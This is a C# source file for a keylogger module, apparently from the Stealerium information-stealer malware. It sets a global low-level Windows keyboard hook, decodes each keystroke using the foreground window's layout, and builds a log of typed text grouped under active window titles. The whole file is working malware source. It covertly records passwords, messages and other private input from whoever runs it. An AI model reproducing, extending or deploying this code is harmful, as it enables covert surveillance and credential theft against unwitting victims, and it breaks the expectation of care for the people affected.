using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stealerium.Modules.Keylogger
{
    internal sealed class Keylogger
    {
        private const int WmKeydown = 0x0100;
        private const int Whkeyboardll = 13;
        private static IntPtr _hookId = IntPtr.Zero;
        private static readonly LowLevelKeyboardProc Proc = HookCallback;
        public static bool KeyloggerEnabled = false;
        public static string KeyLogs = "";
        private static string _prevActiveWindowTitle;
        public static Thread MainThread = new Thread(StartKeylogger);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true,
            CallingConvention = CallingConvention.Winapi)]
        private static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out] [MarshalAs(UnmanagedType.LPWStr)]
            StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);


        private static void StartKeylogger()
        {
            _hookId = SetHook(Proc);
            Application.Run();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(Whkeyboardll, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (!KeyloggerEnabled)
                return IntPtr.Zero;

            if (nCode < 0 || wParam != (IntPtr) WmKeydown) return CallNextHookEx(_hookId, nCode, wParam, lParam);
            var vkCode = Marshal.ReadInt32(lParam);
            var capsLock = (GetKeyState(0x14) & 0xffff) != 0;
            var shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
            var currentKey = KeyboardLayout((uint) vkCode);

            if (capsLock || shiftPress)
                currentKey = currentKey.ToUpper();
            else
                currentKey = currentKey.ToLower();


            if ((Keys) vkCode >= Keys.F1 && (Keys) vkCode <= Keys.F24)
                currentKey = "[" + (Keys) vkCode + "]";

            else
                switch (((Keys) vkCode).ToString())
                {
                    case "Space":
                        currentKey = " ";
                        break;
                    case "Return":
                        currentKey = "[ENTER]";
                        break;
                    case "Escape":
                        currentKey = "[ESC]";
                        break;
                    case "LControlKey":
                        currentKey = "[CTRL]";
                        break;
                    case "RControlKey":
                        currentKey = "[CTRL]";
                        break;
                    case "RShiftKey":
                        currentKey = "[Shift]";
                        break;
                    case "LShiftKey":
                        currentKey = "[Shift]";
                        break;
                    case "Back":
                        currentKey = "[Back]";
                        break;
                    case "LWin":
                        currentKey = "[WIN]";
                        break;
                    case "Tab":
                        currentKey = "[Tab]";
                        break;
                    case "Capital":
                        currentKey = capsLock ? "[CAPSLOCK: OFF]" : "[CAPSLOCK: ON]";
                        break;
                }

            switch (currentKey)
            {
                // If enter
                case "[ENTER]" when _prevActiveWindowTitle == WindowManager.ActiveWindow:
                    KeyLogs += Environment.NewLine;
                    break;
                case "[ENTER]":
                    _prevActiveWindowTitle = WindowManager.ActiveWindow;
                    KeyLogs += $"\n###  {_prevActiveWindowTitle} ###\n";
                    break;
                // If backspace
                case "[Back]" when KeyLogs.Length > 0:
                    KeyLogs = KeyLogs.Remove(KeyLogs.Length - 1, 1);
                    break;
                // If key
                default:
                    KeyLogs += currentKey;
                    break;
            }

            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                var sb = new StringBuilder();
                var vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                var scanCode = MapVirtualKey(vkCode, 0);
                var keyboardLayout =
                    GetKeyboardLayout(GetWindowThreadProcessId(WindowManager.GetForegroundWindow(), out _));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch
            {
                // ignored
            }

            return ((Keys) vkCode).ToString();
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }
}